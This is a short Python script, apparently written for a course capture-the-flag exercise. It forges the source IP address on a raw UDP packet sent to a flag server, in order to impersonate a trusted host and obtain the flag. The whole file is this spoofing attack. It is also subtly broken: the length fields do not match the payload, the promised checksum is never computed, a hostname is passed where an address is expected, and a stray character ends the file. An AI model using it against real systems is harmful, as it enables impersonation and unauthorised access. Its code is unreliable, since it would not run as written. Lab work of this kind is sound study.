import struct
import socket

# create the IP header with the correct source and destination IP addresses
ip_header = struct.pack('!BBHHHBBH4s4s',  # IP header format string
                        69,             # version and header length
                        0,              # type of service
                        20 + 8,         # total length (IP header + UDP header + payload)
                        0,              # identification
                        0,              # flags and fragment offset
                        255,            # time to live
                        socket.IPPROTO_UDP,  # protocol
                        0,              # checksum (will be calculated later)
                        socket.inet_aton('10.2.4.10'),  # source IP address
                        socket.inet_aton('flagserv.cse543.rev.fish')  # destination IP address
                        )

# create the UDP header with the correct source and destination ports
udp_header = struct.pack('!HHHH',  # UDP header format string
                         13337,   # source port
                         13337,   # destination port
                         8 + 7,   # length (UDP header + payload)
                         0        # checksum (not used)
                         )

# combine the IP and UDP headers into a single packet
packet = ip_header + udp_header + b'steal the flag'

# create a raw socket and send the packet
raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
raw_socket.sendto(packet, ('flagserv.cse543.rev.fish', 13337))

# receive the response from FlagServ and check if it contains the flag
response, _ = raw_socket.recvfrom(1024)
if 'flag.txt' in response.decode('utf-8'):
    print('Flag stolen!')
d
